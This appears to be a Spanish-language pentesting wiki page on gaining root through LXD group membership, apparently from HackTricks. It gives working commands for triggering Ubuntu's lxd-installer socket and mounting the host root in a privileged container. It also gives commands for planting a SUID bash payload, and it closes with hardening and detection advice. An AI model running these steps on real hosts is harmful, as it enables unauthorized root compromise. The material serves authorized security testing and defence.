# Grupo lxd/lxc - Escalada de privilegios

{{#include ../../../banners/hacktricks-training.md}}

La pertenencia al grupo de administración LXD del host (normalmente _**lxd**_) puede proporcionar una vía para obtener root al permitir el control total del daemon.<sup>[[1]](#references)</sup> Este es el mismo problema de límite de confianza descrito para [sockets de control en tiempo de ejecución](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) y [montajes del host con permisos de escritura](../../containers-namespaces/container-security/sensitive-host-mounts.md): el acceso a la API de administración puede ser suficiente, incluso si el proceso actual no está ya dentro de un contenedor.<sup>[[1]](#references)</sup>

## Activación de socket de Ubuntu `lxd-installer`

No asumas que pertenecer a `lxd` es inofensivo solo porque no esté instalado el snap de LXD. En Ubuntu Server 24.04 y versiones posteriores, el paquete `lxd-installer` incluido de forma predeterminada expone `/run/lxd-installer.socket` como `root:lxd` con el modo `0660`. Una conexión activa `lxd-installer@.service` como root, que instala el snap de LXD sin contraseña de sudo ni autorización de polkit; algunas versiones del wrapper también omiten el mensaje de confirmación cuando la entrada estándar no es un TTY.<sup>[[10]](#references)[[11]](#references)</sup>

Inspecciona tanto la pertenencia a la cuenta como el servicio activado por socket:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

Una prueba autorizada del grupo `lxd` puede activar el instalador mediante el wrapper `lxc` habitual o conectándose directamente al socket. Esto último demuestra que la ACL del socket Unix, y no el aviso del wrapper, es el límite de autorización real:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Una vez que el daemon esté disponible, continúa con las técnicas de contenedores privilegiados que aparecen a continuación.<sup>[[10]](#references)[[11]](#references)</sup>

## Explotación sin Internet

### Método 1

Puedes descargar una imagen de Alpine para usarla con LXD desde un repositorio de confianza.
El servidor de imágenes de LXD de Canonical publica compilaciones diarias: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Solo tienes que obtener **lxd.tar.xz** y **rootfs.squashfs** de la compilación más reciente (el nombre del directorio es la fecha).<sup>[[8]](#references)</sup>

Como alternativa, puedes instalar distrobuilder en tu máquina siguiendo las [instrucciones del proyecto](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Sube **incus.tar.xz** (**lxd.tar.xz** si descargaste la imagen desde el servidor de imágenes de Canonical) y **rootfs.squashfs**; luego importa la imagen y crea un contenedor.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> Si encuentras este error _**Error: No se encontró ningún pool de almacenamiento. Crea un nuevo pool de almacenamiento**_\
> Ejecuta **`lxd init`**, configura un pool de almacenamiento predeterminado y luego **repite** el bloque anterior de comandos.<sup>[[2]](#references)</sup>

Por último, inicia el contenedor y abre un shell root en el sistema de archivos del host:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Como UID 0 en esta instancia privilegiada no está reasignado, puede crear un payload SUID propiedad del host a través de la raíz del host montada. Esto completa el pivot del contenedor al host, en lugar de dejar al operador en una shell del contenedor:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Coloca el payload en un sistema de archivos que admita SUID. Un `/tmp` independiente suele montarse con `nosuid` y puede no aparecer en un bind no recursivo de `/` del host, por lo que una ruta como `/rootbash` en el sistema de archivos raíz del host es más fiable para esta prueba.<sup>[[10]](#references)[[11]](#references)</sup>

### Método 2

Crea una imagen Alpine e iníciala con la flag `security.privileged=true`, que asigna el root del contenedor al root del host; montar `/` expone el sistema de archivos del host dentro del contenedor.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Efecto secundario de AppArmor en todo el host

Iniciar el snap de LXD también puede escribir `/run/sysctl.d/zz-lxd.conf` y establecer tanto `kernel.apparmor_restrict_unprivileged_userns` como `kernel.apparmor_restrict_unprivileged_unconfined` en `0`. Esto debilita las restricciones de Ubuntu sobre los espacios de nombres de usuario sin privilegios para todos los usuarios locales, así que registra los valores antes y después de activar LXD al evaluar el host.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Auditoría y hardening

Considera la pertenencia a `lxd` como una concesión de root. Quitar a un miembro que no sea necesario surte efecto en las nuevas sesiones de inicio de sesión; purgar `lxd-installer` o enmascarar su socket solo elimina la ruta de instalación bajo demanda y **no** limita a un usuario que ya puede acceder a un daemon LXD instalado.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Entre los indicadores útiles de compromiso se incluyen instancias de LXD con `security.privileged=true`, dispositivos de disco cuyo `source` es `/`, conexiones inesperadas a `/run/lxd-installer.socket`, nuevos archivos SUID y un cambio de los sysctls de AppArmor anteriores de `1` a `0`.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [Cómo reforzar la seguridad de LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Contenedores y máquinas virtuales de LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Cómo copiar e importar imágenes](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Cómo crear imágenes con distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Definición de imagen de Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Script de compilación de lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Servidor de imágenes de LXD](https://images.lxd.canonical.com/)
- [9] [Tipo: disco](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [Informe y PoC de STAR Labs sobre la escalada de privilegios mediante el grupo LXD](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Vino viejo en botella nueva: la escalada a root mediante el grupo LXD, con una década de antigüedad, vuelve a estar armada](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
